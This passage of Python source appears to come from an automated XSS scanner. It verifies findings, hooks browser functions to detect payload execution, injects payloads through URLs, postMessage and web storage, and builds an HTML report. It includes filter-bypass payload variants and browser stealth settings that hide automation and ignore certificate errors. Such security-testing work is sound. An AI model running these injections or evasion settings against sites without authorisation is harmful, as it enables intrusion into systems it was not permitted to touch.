                        technologies['servers'].append(server)
                elif 'Backend:' in tech:
                    language = tech.replace('Backend:', '').strip()
                    if language not in technologies['languages']:
                        technologies['languages'].append(language)

        # Detect security headers
        for page in pages:
            if page.security_headers:
                technologies['security'].append('Has Security Headers')
                break

        return technologies

    def _verify_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Verify vulnerabilities with multiple methods"""
        verified = []

        for vuln in vulnerabilities:
            # Skip verification for low confidence findings
            if vuln.confidence < 0.5 and vuln.severity not in ['high', 'critical']:
                vuln.verified = False
                verified.append(vuln)
                continue

            # Use appropriate verification method
            verification_method = self.config.verification_method

            if verification_method == 'browser' and self.browser_manager:
                verified_vuln = self._verify_with_browser(vuln)
            elif verification_method == 'multi':
                verified_vuln = self._verify_with_multiple_methods(vuln)
            else:
                verified_vuln = self._verify_with_simple_method(vuln)

            verified.append(verified_vuln)

            # Update statistics
            if verified_vuln.verified:
                self.stats['verified_xss'] += 1

        return verified

    def _verify_with_browser(self, vuln: Vulnerability) -> Vulnerability:
        """Verify vulnerability with browser automation"""
        if vuln.type == 'dom' and self.browser_manager:
            # DOM XSS already verified by browser
            vuln.verified = True
            vuln.verification_method = 'browser_automation'
        elif vuln.type in ['reflected', 'stored']:
            # Test with browser
            try:
                result = self.browser_manager.test_dom_execution(vuln.url, vuln.payload)
                vuln.verified = result['executed']
                vuln.verification_method = 'browser_automation'
                vuln.context['browser_verification'] = result
            except Exception as e:
                self.logger.debug(f"Browser verification failed: {e}")
                vuln.verified = False

        return vuln

    def _verify_with_multiple_methods(self, vuln: Vulnerability) -> Vulnerability:
        """Verify with multiple methods"""
        verification_results = []

        if vuln.type == "reflected":
            return self._verify_reflected(vuln)

        if vuln.type == "stored":
            return self._verify_stored(vuln)

        if vuln.type == "dom":
            return self._verify_dom(vuln)

        if vuln.type == "blind":
            return self._verify_blind(vuln)


        # Method 2: Check for encoding
        verification_results.append(self._verify_encoding(vuln))

        # Method 3: Check context again
        verification_results.append(self._verify_context(vuln))

        # Determine final verification
        true_count = sum(verification_results)
        vuln.verified = true_count >= 2  # At least 2 methods confirm
        vuln.verification_method = f"multi_method_{true_count}_of_{len(verification_results)}"

        return vuln

    #-----------------------------
    #DONE

    def _verify_dom(self, vuln: Vulnerability) -> Vulnerability:
        """
        DOM XSS is verified by source → sink flow.
        """

        if vuln.context.get("browser_verified"):
            vuln.verified = True
            vuln.verification_method = "browser_automation"
        else:
            vuln.verified = False
            vuln.verification_method = "dom_unconfirmed"

        return vuln
    #---------------------------------------


    #-------------------done

    def _verify_reflected(self, vuln: Vulnerability) -> Vulnerability:
        """
        Reflected XSS is verified ONLY using the response
        that contained the injected payload.
        """

        if vuln.context.get("reflection_context") != "safe" and vuln.context.get("verified_inline"):
            vuln.verified = True
            vuln.verification_method = "reflected_payload_context"
        else:
            vuln.verified = False
            vuln.verification_method = "reflected_safe_context"

        return vuln


    #-----------------------------------
    #DONE

    def _verify_blind(self, vuln: Vulnerability) -> Vulnerability:
        """
        Blind XSS is verified only via out-of-band callbacks.
        """

        if vuln.context.get("oob_triggered"):
            vuln.verified = True
            vuln.verification_method = "blind_oob_callback"
        else:
            vuln.verified = False
            vuln.verification_method = "blind_pending"

        return vuln
    #----------------------------
    #DONE

    def _verify_stored(self, vuln: Vulnerability) -> Vulnerability:
        """
        Stored XSS is verified by persistence across requests.
        """

        if vuln.context.get("storage_verified"):
            vuln.verified = True
            vuln.verification_method = "stored_persistence"
        else:
            vuln.verified = False
            vuln.verification_method = "stored_not_rendered"

        return vuln
    #----------------------------------

    def _verify_with_simple_method(self, vuln: Vulnerability) -> Vulnerability:
        """Simple verification by re-testing"""
        if vuln.type == 'reflected':
            try:
                response = self.http_client.get(vuln.url)
                if response and vuln.payload in response.text:
                    vuln.verified = True
                    vuln.verification_method = 're_test'
            except:
                vuln.verified = False
        else:
            vuln.verified = False

        return vuln

    def _verify_reflected_different_payload(self, vuln: Vulnerability) -> bool:
        """Verify by testing with a different payload"""
        try:
            # Create a variation of the payload
            if '<script>' in vuln.payload:
                test_payload = vuln.payload.replace('<script>', '<scr<script>ipt>')
            elif 'onerror=' in vuln.payload:
                test_payload = vuln.payload.replace('onerror=', 'onerror=alert(2);')
            else:
                test_payload = f"{vuln.payload}--verified"

            # Test with new payload
            response = self.http_client.get(vuln.url.replace(vuln.payload, test_payload))
            if response and test_payload in response.text:
                return True
        except:
            pass

        return False

    def _verify_encoding(self, vuln: Vulnerability) -> bool:
        """Verify if payload is properly encoded in response"""
        try:
            response = self.http_client.get(vuln.url)
            if not response:
                return False

            # Check if payload appears in dangerous encoded forms
            dangerous_encodings = [
                vuln.payload,  # Exact
                html.escape(vuln.payload),  # HTML encoded
                vuln.payload.replace('<', '&lt;').replace('>', '&gt;'),  # Basic HTML
            ]

            for encoding in dangerous_encodings:
                if encoding in response.text:
                    return True
        except:
            pass

        return False

    def _verify_context(self, vuln: Vulnerability) -> bool:
        """Verify the context is dangerous"""
        try:
            response = self.http_client.get(vuln.url)
            if not response:
                return False

            # Analyze context
            context_info = self._analyze_reflection(vuln.payload, response.text)
            return context_info['context'] not in ['safe', 'text']
        except:
            return False

    def _assess_vulnerability_risks(self):
        """Assess and score vulnerability risks"""
        for vuln in self.verified_vulnerabilities:
            # Calculate risk score
            risk_score = vuln.confidence * 100

            # Adjust based on severity
            severity_multipliers = {
                'critical': 1.5,
                'high': 1.3,
                'medium': 1.0,
                'low': 0.7,
                'info': 0.3,
            }
            risk_score *= severity_multipliers.get(vuln.severity, 1.0)

            # Adjust based on type
            type_multipliers = {
                'stored': 1.4,
                'dom': 1.2,
                'reflected': 1.0,
                'blind': 0.8,
                'json': 0.9,
            }
            risk_score *= type_multipliers.get(vuln.type, 1.0)

            # Adjust for verification
            if vuln.verified:
                risk_score *= 1.2

            # Cap at 100
            vuln.risk_score = min(100.0, risk_score)

    def _create_result(self, pages: List[PageInfo], technologies: Dict,
                       start_time: datetime) -> ScanResult:
        """Create scan result object"""
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()

        # Calculate risk level
        total_risk = sum(v.risk_score for v in self.verified_vulnerabilities)
        avg_risk = total_risk / len(self.verified_vulnerabilities) if self.verified_vulnerabilities else 0

        if avg_risk >= 70:
            risk_level = 'critical'
        elif avg_risk >= 50:
            risk_level = 'high'
        elif avg_risk >= 30:
            risk_level = 'medium'
        elif avg_risk >= 10:
            risk_level = 'low'
        else:
            risk_level = 'info'

        result = ScanResult(
            scan_id=self.config.scan_id,
            target_url=self.config.target_url,
            start_time=start_time,
            end_time=end_time,
            duration=duration,
            pages_scanned=len(pages),
            requests_made=self.http_client.stats['requests'],
            vulnerabilities_found=len(self.verified_vulnerabilities),
            vulnerabilities=self.verified_vulnerabilities,
            pages=pages,
            technologies=technologies,
            risk_level=risk_level,
            risk_score=avg_risk,
            config=self.config.__dict__
        )

        return result

    def _create_empty_result(self, start_time: datetime) -> ScanResult:
        """Create empty result when no pages found"""
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()

        return ScanResult(
            scan_id=self.config.scan_id,
            target_url=self.config.target_url,
            start_time=start_time,
            end_time=end_time,
            duration=duration,
            pages_scanned=0,
            requests_made=0,
            vulnerabilities_found=0,
            vulnerabilities=[],
            pages=[],
            technologies={},
            risk_level='info',
            risk_score=0.0,
            config=self.config.__dict__
        )






#-------------------------hooks for dom
DOM_HOOK_TEMPLATE = r"""
(function () {
  const MARKER = "__XSS_MARKER__";

  window.__xss = {
    executed: false,
    method: null,
    log: []
  };

  function mark(method, data) {
    try {
      if (data && JSON.stringify(data).includes(MARKER)) {
        window.__xss.executed = true;
        window.__xss.method = method;
        window.__xss.log.push({method: method, data: data});
      }
    } catch (e) {}
  }

  ['alert','confirm','prompt'].forEach(fn => {
    const orig = window[fn];
    window[fn] = function (...args) {
      mark(fn, args);
      return orig && orig.apply(this, args);
    };
  });

  const origEval = window.eval;
  window.eval = function (...args) {
    mark('eval', args);
    return origEval.apply(this, args);
  };

  const OrigFunction = window.Function;
  window.Function = function (...args) {
    mark('Function', args);
    return OrigFunction.apply(this, args);
  };

  const origWrite = document.write;
  document.write = function (html) {
    mark('document.write', html);
    return origWrite.apply(document, arguments);
  };

  const desc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
  Object.defineProperty(Element.prototype, 'innerHTML', {
    set(value) {
      mark('innerHTML', value);
      return desc.set.call(this, value);
    }
  });

  window.addEventListener("message", function (e) {
    mark("postMessage", e.data);
  });
})();
"""





#-------------------------------

# ============================================================================
# BROWSER MANAGER
# ============================================================================

class BrowserManager:
    """Manage browser instances for DOM XSS testing"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.logger = logging.getLogger(f"{config.scanner_name}.BrowserManager")

        # Browser instances
        self.drivers = []
        self.driver_lock = threading.Lock()

        # Statistics
        self.stats = {
            'browser_sessions': 0,
            'dom_tests': 0,
            'executions_detected': 0,
            'errors': 0,
        }

        # Initialize browser pool
        self._init_browser_pool()

    def _init_browser_pool(self):
        """Initialize pool of browser instances"""
        max_instances = min(self.config.browser_max_instances, self.config.max_threads)

        for i in range(max_instances):
            try:
                driver = self._create_driver()
                if driver:
                    self.drivers.append(driver)
                    self.stats['browser_sessions'] += 1
            except Exception as e:
                self.logger.error(f"Failed to create browser instance {i}: {e}")

        if not self.drivers:
            self.logger.warning("No browser instances created. DOM XSS scanning disabled.")

    def _create_driver(self):
        """Create a browser driver instance"""
        try:
            if self.config.browser_type == 'chrome':
                options = ChromeOptions()

                if self.config.headless:
                    options.add_argument('--headless=new')


                #------------------------aded later for solve tls issue
                options.add_argument('--ignore-certificate-errors')
                options.add_argument('--allow-insecure-localhost')
                options.set_capability("acceptInsecureCerts", True)
                #------------------

                # Performance and stealth options
                options.add_argument('--no-sandbox')
                options.add_argument('--disable-dev-shm-usage')
                options.add_argument('--disable-gpu')
                options.add_argument('--window-size=1920,1080')
                #options.add_argument('--disable-blink-features=AutomationControlled') action for security no false positive

                # Disable images and unnecessary features for speed
                prefs = {
                    #"profile.managed_default_content_settings.images": 2,
                    "profile.default_content_setting_values.notifications": 2,
                    "profile.default_content_setting_values.popups": 2,
                    "profile.default_content_setting_values.geolocation": 2,
                    "profile.default_content_setting_values.media_stream": 2,
                }
                options.add_experimental_option("prefs", prefs)

                # Add stealth
                options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
                options.add_experimental_option('useAutomationExtension', False)

                driver = webdriver.Chrome(options=options)

                # Set timeouts
                driver.set_page_load_timeout(self.config.browser_timeout)
                driver.set_script_timeout(self.config.browser_timeout)

                # Stealth script
                driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                    'source': '''
                        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                        window.chrome = { runtime: {} };
                    '''
                })

                return driver

            elif self.config.browser_type == 'firefox':
                options = FirefoxOptions()

                if self.config.headless:
                    options.add_argument('--headless')

                options.add_argument('--no-sandbox')
                options.add_argument('--disable-dev-shm-usage')
                options.accept_insecure_certs = True

                driver = webdriver.Firefox(options=options)
                driver.set_page_load_timeout(self.config.browser_timeout)
                driver.set_script_timeout(self.config.browser_timeout)

                return driver

            else:
                self.logger.error(f"Unsupported browser type: {self.config.browser_type}")
                return None

        except Exception as e:
            self.logger.error(f"Failed to create browser driver: {e}")
            return None

    def get_driver(self):
        """Get an available browser driver"""
        with self.driver_lock:
            if self.drivers:
                return self.drivers.pop()
            else:
                # Create new driver if pool is empty
                try:
                    driver = self._create_driver()
                    if driver:
                        self.stats['browser_sessions'] += 1
                    return driver
                except:
                    return None

    def return_driver(self, driver):
        """Return driver to pool"""
        with self.driver_lock:
            if driver and len(self.drivers) < self.config.browser_max_instances:
                self.drivers.append(driver)
            elif driver:
                # Too many drivers, quit this one
                try:
                    driver.quit()
                except:
                    pass

    def test_dom_execution(self, url: str, payload: str) -> Dict:
        driver = self.get_driver()
        if not driver:
            return {'executed': False, 'error': 'no_browser'}

        marker = f"__XSS_{uuid.uuid4().hex}__"
        payload = payload.replace("{{MARKER}}", marker)
        hook = DOM_HOOK_TEMPLATE.replace("__XSS_MARKER__", marker)

        try:
            self.stats['dom_tests'] += 1

            # Inject hooks BEFORE navigation (Chrome strict, Firefox best-effort)
            if self.config.browser_type == 'chrome':
                driver.execute_cdp_cmd(
                    "Page.addScriptToEvaluateOnNewDocument",
                    {"source": hook}
                )
            else:
                driver.get("about:blank")
                driver.execute_script(hook)

            driver.get(url)

            try:
                WebDriverWait(driver, 6).until(
                    lambda d: d.execute_script(
                        "return window.__xss && window.__xss.executed === true"
                    )
                )
            except TimeoutException:
                pass

            result = driver.execute_script("return window.__xss || {};")

            executed = bool(result.get("executed"))
            method = result.get("method")
            log = result.get("log", [])

            if executed:
                self.stats['executions_detected'] += 1

            return {
                'executed': executed,
                'method': method,
                'log': log,
                'url': url,
                'payload': payload[:100],
                'marker': marker
            }

        except Exception as e:
            self.stats['errors'] += 1
            return {'executed': False, 'error': str(e)}

        finally:
            self.return_driver(driver)

    def test_postmessage_execution(self, url: str, payload: str) -> Dict:
        driver = self.get_driver()
        if not driver:
            return {'executed': False, 'error': 'no_browser'}

        marker = f"__XSS_{uuid.uuid4().hex}__"
        payload = payload.replace("{{MARKER}}", marker)
        hook = DOM_HOOK_TEMPLATE.replace("__XSS_MARKER__", marker)

        try:
            self.stats['dom_tests'] += 1

            if self.config.browser_type == 'chrome':
                driver.execute_cdp_cmd(
                    "Page.addScriptToEvaluateOnNewDocument",
                    {"source": hook}
                )
            else:
                driver.get("about:blank")
                driver.execute_script(hook)

            driver.get(url)

            driver.execute_script("""
                window.postMessage({ message: arguments[0] }, "*");
            """, payload)

            try:
                WebDriverWait(driver, 5).until(
                    lambda d: d.execute_script(
                        "return window.__xss && window.__xss.executed === true"
                    )
                )
            except TimeoutException:
                pass

            result = driver.execute_script("return window.__xss || {};")

            executed = bool(result.get("executed"))
            method = result.get("method")

            if executed:
                self.stats['executions_detected'] += 1

            return {
                'executed': executed,
                'method': method,
                'url': url,
                'payload': payload[:100],
                'marker': marker
            }

        except Exception as e:
            self.stats['errors'] += 1
            return {'executed': False, 'error': str(e)}

        finally:
            self.return_driver(driver)

    def test_web_storage_execution(self, url: str, payload: str) -> Dict:
        driver = self.get_driver()
        if not driver:
            return {'executed': False, 'error': 'no_browser'}

        marker = f"__XSS_{uuid.uuid4().hex}__"
        payload = payload.replace("{{MARKER}}", marker)
        hook = DOM_HOOK_TEMPLATE.replace("__XSS_MARKER__", marker)

        try:
            self.stats['dom_tests'] += 1

            if self.config.browser_type == 'chrome':
                driver.execute_cdp_cmd(
                    "Page.addScriptToEvaluateOnNewDocument",
                    {"source": hook}
                )
            else:
                driver.get("about:blank")
                driver.execute_script(hook)

            driver.get(url)

            driver.execute_script("""
                localStorage.setItem("xss", arguments[0]);
                sessionStorage.setItem("xss", arguments[0]);
            """, payload)

            driver.refresh()

            try:
                WebDriverWait(driver, 5).until(
                    lambda d: d.execute_script(
                        "return window.__xss && window.__xss.executed === true"
                    )
                )
            except TimeoutException:
                pass

            result = driver.execute_script("return window.__xss || {};")

            executed = bool(result.get("executed"))
            method = result.get("method")

            if executed:
                self.stats['executions_detected'] += 1

            return {
                'executed': executed,
                'method': method,
                'storage': 'webStorage',
                'url': url,
                'payload': payload[:100],
                'marker': marker
            }

        except Exception as e:
            self.stats['errors'] += 1
            return {'executed': False, 'error': str(e)}

        finally:
            self.return_driver(driver)

    def close_all(self):
        """Close all browser instances"""
        with self.driver_lock:
            for driver in self.drivers:
                try:
                    driver.quit()
                except:
                    pass
            self.drivers.clear()

# ============================================================================
# JAVASCRIPT ANALYZER
# ============================================================================

class JavaScriptAnalyzer:
    """Analyze JavaScript for XSS sinks and sources"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.logger = logging.getLogger(f"{config.scanner_name}.JSAnalyzer")

        # Sources (user-controlled inputs)
        self.sources = [
            'location.hash',
            'location.search',
            'document.URL',
            'document.documentURI',
            'document.baseURI',
            'document.referrer',
            'window.name',
            'localStorage',
            'sessionStorage',
            'document.cookie',
            'postMessage',
            'URLSearchParams',
            'history.pushState',
            'history.replaceState',
            'window.location',
            'document.location',
            'XMLHttpRequest.responseText',
            'fetch.response',
        ]

        # Sinks (dangerous functions)
        self.sinks = [
            # HTML sinks
            'innerHTML',
            'outerHTML',
            'document.write',
            'document.writeln',
            'insertAdjacentHTML',

            # JavaScript execution
            'eval',
            'Function',
            'setTimeout',
            'setInterval',
            'execScript',

            # URL navigation
            'location',
            'location.href',
            'location.assign',
            'location.replace',
            'window.open',

            # Event handlers
            'onload',
            'onerror',
            'onclick',
            'onmouseover',
            'onsubmit',
            'onchange',

            # jQuery
            '$().html',
            '$().append',
            '$().prepend',
            '$().before',
            '$().after',
            '$().replaceWith',
        ]

        # Framework-specific sinks
        self.framework_sinks = {
            'React': ['dangerouslySetInnerHTML'],
            'Vue': ['v-html'],
            'Angular': ['[innerHTML]', 'bypassSecurityTrustHtml'],
        }

    def analyze(self, javascript: str, frameworks: List[str] = None) -> List[Dict]:
        """Analyze JavaScript code for XSS patterns"""
        findings = []

        try:
            # Convert to lowercase for case-insensitive search
            js_lower = javascript.lower()

            # Look for sources
            for source in self.sources:
                if source.lower() in js_lower:
                    findings.append({
                        'type': 'source',
                        'name': source,
                        'description': f'User-controlled source detected: {source}'
                    })

            # Look for sinks
            for sink in self.sinks:
                if sink.lower() in js_lower:
                    findings.append({
                        'type': 'sink',
                        'name': sink,
                        'description': f'Dangerous sink detected: {sink}'
                    })

            # Look for framework-specific sinks
            if frameworks:
                for framework in frameworks:
                    if framework in self.framework_sinks:
                        for sink in self.framework_sinks[framework]:
                            if sink.lower() in js_lower:
                                findings.append({
                                    'type': 'framework_sink',
                                    'framework': framework,
                                    'name': sink,
                                    'description': f'{framework} dangerous sink: {sink}'
                                })

            # Look for source-to-sink patterns
            for source in self.sources[:5]:  # Check first 5 sources
                for sink in self.sinks[:5]:  # Check first 5 sinks
                    # Simple pattern: source near sink
                    source_pos = js_lower.find(source.lower())
                    sink_pos = js_lower.find(sink.lower())

                    if source_pos != -1 and sink_pos != -1:
                        distance = abs(source_pos - sink_pos)
                        if distance < 500:  # Within 500 characters
                            findings.append({
                                'type': 'potential_flow',
                                'source': source,
                                'sink': sink,
                                'distance': distance,
                                'description': f'Potential flow from {source} to {sink}'
                            })

        except Exception as e:
            self.logger.debug(f"JavaScript analysis failed: {e}")

        return findings

# ============================================================================
# OOB SERVER
# ============================================================================

class OOBServer:
    """Out-of-Band detection server"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.logger = logging.getLogger(f"{config.scanner_name}.OOBServer")

        # Callback tracking
        self.callbacks = {}

        # Start server if configured
        if config.oob_protocol == 'http':
            self._start_http_server()
        elif config.oob_protocol == 'dns':
            self._start_dns_server()

    def _start_http_server(self):
        """Start HTTP server for callbacks"""
        # This is a simplified implementation
        # In production, you would use a real HTTP server
        self.logger.info(f"OOB HTTP server would listen on {self.config.oob_domain}")

    def _start_dns_server(self):
        """Start DNS server for callbacks"""
        # Simplified implementation
        self.logger.info(f"OOB DNS server would listen on {self.config.oob_domain}")

    def check_callbacks(self, callback_id: str) -> bool:
        """Check if callback was received"""
        # Simulated implementation
        # In production, you would check your server logs
        return callback_id in self.callbacks

    def register_callback(self, callback_id: str):
        """Register a callback ID"""
        self.callbacks[callback_id] = {
            'id': callback_id,
            'registered': datetime.now(),
            'received': False
        }

# ============================================================================
# REPORT GENERATOR
# ============================================================================

class ProfessionalReportGenerator:
    """Generate professional reports in multiple formats"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.logger = logging.getLogger(f"{config.scanner_name}.ReportGenerator")

        # Setup templates
        self._setup_templates()

        # Create output directory
        self.report_dir = os.path.join(config.output_dir, config.scan_id)
        os.makedirs(self.report_dir, exist_ok=True)

    def _setup_templates(self):
        """Setup Jinja2 templates for HTML reports"""
        if JINJA2_AVAILABLE:
            # Create template directory
            template_dir = os.path.join(os.path.dirname(__file__), 'templates')
            os.makedirs(template_dir, exist_ok=True)

            # Create default template if it doesn't exist
            template_file = os.path.join(template_dir, 'report.html.j2')
            if not os.path.exists(template_file):
                self._create_default_template(template_file)

            # Load template environment
            self.template_env = jinja2.Environment(
                loader=jinja2.FileSystemLoader(template_dir),
                autoescape=jinja2.select_autoescape(['html', 'xml'])
            )
            self.template_env.filters['safe_text'] = (
                lambda x: html.escape(str(x), quote=True)
            )
        else:
            self.template_env = None

    def _create_default_template(self, template_file: str):
        """Create default HTML template"""
        template = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy"
      content="
        default-src 'self';
        script-src 'self' 'unsafe-inline';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data:;
        object-src 'none';
        base-uri 'none';
        frame-ancestors 'none';
      ">

    <title>XSS Scan Report - {{ scan_id }}</title>
    <style>
        :root {
            --primary-color: #2563eb;
            --danger-color: #dc2626;
            --warning-color: #f59e0b;
            --success-color: #10b981;
            --info-color: #6b7280;
            --bg-color: #f9fafb;
            --card-bg: #ffffff;
            --border-color: #e5e7eb;
            --text-primary: #111827;
            --text-secondary: #6b7280;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            line-height: 1.6;
            color: var(--text-primary);
            background-color: var(--bg-color);
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            background: linear-gradient(135deg, var(--primary-color), #1d4ed8);
            color: white;
            padding: 40px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .header .subtitle {
            font-size: 1.1rem;
            opacity: 0.9;
        }

        .summary-cards {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .summary-card {
            background: var(--card-bg);
            border-radius: 8px;
            padding: 25px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
            border-left: 4px solid var(--primary-color);
        }

        .summary-card.critical {
            border-left-color: var(--danger-color);
        }

        .summary-card.high {
            border-left-color: var(--warning-color);
        }

        .summary-card.medium {
            border-left-color: var(--info-color);
        }

        .summary-card.low {
            border-left-color: var(--success-color);
        }

        .card-title {
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-secondary);
            margin-bottom: 10px;
        }

        .card-value {
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .card-subtitle {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .section {
            background: var(--card-bg);
            border-radius: 8px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
        }

        .section-title {
            font-size: 1.5rem;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid var(--border-color);
            color: var(--text-primary);
        }

        .vulnerability-card {
            background: var(--card-bg);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid var(--border-color);
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .vulnerability-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        .vulnerability-card.critical {
            border-left: 4px solid var(--danger-color);
        }

        .vulnerability-card.high {
            border-left: 4px solid var(--warning-color);
        }

        .vulnerability-card.medium {
            border-left: 4px solid var(--info-color);
        }

        .vulnerability-card.low {
            border-left: 4px solid var(--success-color);
        }

        .vuln-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .vuln-title {
            font-size: 1.2rem;
            font-weight: 600;
        }

        .severity-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .severity-critical {
            background-color: #fee2e2;
            color: var(--danger-color);
        }

        .severity-high {
            background-color: #fef3c7;
            color: var(--warning-color);
        }

        .severity-medium {
            background-color: #e5e7eb;
            color: var(--text-secondary);
        }

        .severity-low {
            background-color: #d1fae5;
            color: var(--success-color);
        }

        .vuln-details {
            margin-bottom: 15px;
        }

        .detail-row {
            display: flex;
            margin-bottom: 8px;
        }

        .detail-label {
            font-weight: 600;
            min-width: 120px;
            color: var(--text-secondary);
        }

        .detail-value {
            flex: 1;
            word-break: break-all;
        }

        .code-block {
            background: #1f2937;
            color: #e5e7eb;
            padding: 15px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            overflow-x: auto;
            margin: 10px 0;
        }

        .collapsible {
            margin-top: 15px;
        }

        .collapsible-header {
            background: var(--bg-color);
            padding: 10px 15px;
            border-radius: 6px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: 600;
            user-select: none;
        }

        .collapsible-content {
            padding: 15px;
            background: var(--bg-color);
            border-radius: 0 0 6px 6px;
            margin-top: -5px;
            display: none;
        }

        .collapsible.active .collapsible-content {
            display: block;
        }

        .footer {
            text-align: center;
            padding: 30px;
            color: var(--text-secondary);
            font-size: 0.9rem;
            border-top: 1px solid var(--border-color);
            margin-top: 30px;
        }
        pre.code-block {
            white-space: pre-wrap;
            word-break: break-word;
            max-width: 100%;
        }


        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }

            .header {
                padding: 20px;
            }

            .header h1 {
                font-size: 1.8rem;
            }

            .summary-cards {
                grid-template-columns: 1fr;
            }

            .vuln-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }

            .detail-row {
                flex-direction: column;
                gap: 5px;
            }

            .detail-label {
                min-width: auto;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>XSS Vulnerability Scan Report</h1>
            <p class="subtitle">Scan ID: {{ scan_id }} | Target: {{ target_url }} | Generated: {{ timestamp }}</p>
        </div>

        <div class="summary-cards">
            <div class="summary-card {% if risk_level == 'critical' %}critical{% endif %}">
                <div class="card-title">Risk Level</div>
                <div class="card-value">{{ risk_level|upper }}</div>
                <div class="card-subtitle">Score: {{ risk_score }}/100</div>
            </div>

            <div class="summary-card">
                <div class="card-title">Total Vulnerabilities</div>
                <div class="card-value">{{ total_vulnerabilities }}</div>
                <div class="card-subtitle">{{ verified_count }} verified</div>
            </div>

            <div class="summary-card critical">
                <div class="card-title">Critical</div>
                <div class="card-value">{{ critical_count }}</div>
                <div class="card-subtitle">Immediate attention required</div>
            </div>

            <div class="summary-card high">
                <div class="card-title">High</div>
                <div class="card-value">{{ high_count }}</div>
                <div class="card-subtitle">Address as soon as possible</div>
            </div>
            <div class="summary-card medium">
                <div class="card-title">Medium</div>
                <div class="card-value">{{ medium_count }}</div>
                <div class="card-subtitle">Need to be addressed</div>
            </div>
            <div class="summary-card low">
                <div class="card-title">Low</div>
                <div class="card-value">{{ low_count }}</div>
                <div class="card-subtitle">May impact</div>
            </div>
            
        </div>

                <div class="section">
                    <h2 class="section-title">Executive Summary</h2>
                    <p><strong>Scan Duration:</strong> {{ duration }} seconds</p>
                    <p><strong>Pages Scanned:</strong> {{ pages_scanned }}</p>
                    <p><strong>Total Requests:</strong> {{ requests_made }}</p>
                    <p><strong>Technologies Detected:</strong> {{ technologies|length }}</p>
                    <p><strong>WAF Detected:</strong> {{ 'Yes' if waf_detected else 'No' }}</p>
                    <p><strong>CSP Enabled:</strong> {{ 'Yes' if csp_detected else 'No' }}</p>
                </div>

                {% if vulnerabilities %}
                <div class="section">
                    <h2 class="section-title">Vulnerabilities ({{ vulnerabilities|length }})</h2>

                    {% for vuln in vulnerabilities %}
                    <div class="vulnerability-card {{ vuln.severity }}">
                        <div class="vuln-header">
                            <div class="vuln-title">
                                {{ vuln.type|upper }} XSS - {{ vuln.parameter }}
                                {% if vuln.verified %}
                                <span style="color: var(--success-color); margin-left: 10px;">✓ Verified</span>
                                {% endif %}
                            </div>
                            <div class="severity-badge severity-{{ vuln.severity }}">
                                {{ vuln.severity|upper }}
                            </div>
                        </div>

                        <div class="vuln-details">
                            <div class="detail-row">
                                <div class="detail-label">URL:</div>
                                <div class="detail-value">{{ vuln.url |safe_text }}</div>
                            </div>
                            <div class="detail-row">
                                <div class="detail-label">Method:</div>
                                <div class="detail-value">{{ vuln.method | safe_text }}</div>
                            </div>
                            <div class="detail-row">
                                <div class="detail-label">Parameter:</div>
                                <div class="detail-value">{{ vuln.parameter|safe_text }}</div>
                            </div>
                            <div class="detail-row">
                                <div class="detail-label">Payload:</div>
                                <div class="detail-value">
                                    <pre class="code-block"><code>{{ vuln.payload | safe_text }}</code></pre>
                                </div>
                            </div>
                            <div class="detail-row">
                                <div class="detail-label">Confidence:</div>
                                <div class="detail-value">{{ (vuln.confidence * 100)|round(1) }}%</div>
                            </div>
                            <div class="detail-row">
                                <div class="detail-label">CVSS Score:</div>
                                <div class="detail-value">{{ vuln.cvss_score|round(1) }}/10 ({{ vuln.cvss_vector }})</div>
                            </div>
                        </div>

                        <div class="collapsible">
                            <!--old inside collapsible-header onclick="this.parentElement.classList.toggle('active')"-->
                            <div class="collapsible-header">
                                <span>Show Details</span>
                                <span>▼</span>
                            </div>
                            <div class="collapsible-content">
